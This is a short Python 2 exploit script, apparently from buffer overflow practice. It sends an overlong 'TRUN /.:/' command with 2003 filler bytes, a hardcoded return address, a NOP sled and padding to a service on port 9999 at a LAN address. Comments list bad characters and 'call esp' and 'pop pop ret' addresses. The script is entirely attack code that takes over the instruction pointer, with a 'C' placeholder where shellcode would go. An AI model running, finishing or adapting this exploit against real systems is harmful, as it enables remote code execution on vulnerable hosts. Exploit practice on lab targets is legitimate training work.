#!/usr/bin/python

import socket


#Badchar = \x00\x0a\x0d
#call esp address: 7C836B80
# pop pop ret = pop eax | pop ebp | ret = 7C974042


buff = "TRUN /.:/" #command to be sent
buff += "A" * 2003 + "\x42\x40\x97\x7c" + "\x90" * 12 + "C" * (5000-2003-16)

s = socket.socket( socket.AF_INET, socket.SOCK_STREAM ) # creating the socket
s.connect(("192.168.0.156",9999)) #connect to the target
print s.recv(1024) #print response
s.send(buff) #send the stage
s.close() #close socket
